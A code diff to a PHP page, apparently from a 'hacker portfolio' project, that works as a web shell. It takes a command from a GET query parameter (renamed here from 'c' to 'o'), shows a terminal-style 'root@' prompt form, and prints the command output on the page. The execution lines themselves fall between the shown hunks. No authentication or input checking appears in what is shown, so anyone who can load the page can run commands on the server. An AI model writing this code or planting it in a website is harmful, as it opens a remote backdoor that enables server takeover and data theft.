@@ -10,7 +10,7 @@
  <body>
  
   <?php
-$cmd = $_GET["c"];
+$cmd = $_GET["o"];
 if ($cmd == "") 
 {
 echo "<font color='white' >#NEVER TRY TO HACK A HACKER </font>";
@@ -24,15 +24,10 @@ echo "<pre>" . var_export($output, TRUE) . "</pre>\\n";
 ?>
   
 <form method="GET">
-root@b2l2l: <input type="text" name="c"><br>
+<font color='white' >root@b2l2l:</font> <input type="text" name="o"><br>
 </form>
 
-   </div>
-   <div id="bottomline">
-    <span id="inputline"><span id="prompt"></span><span id="lcommand"></span><span id="cursor" >&nbsp;</span><span id="rcommand"></span></span><span id="spinner"></span>
-   </div>
-  </div>
-  <div id="credit">re-coded by <a href="http://b2l2l.com">Bilal barzinji</a>.<a href="http://github.com/b2l2l/cmdforweb">Source code on github</a>.</div>
+  <div id="credit">coded by <a href="http://b2l2l.com">Bilal barzinji</a>.<a href="http://github.com/b2l2l/hackerportfolio">Source code on github</a>.</div>
  </body
 </html>
 
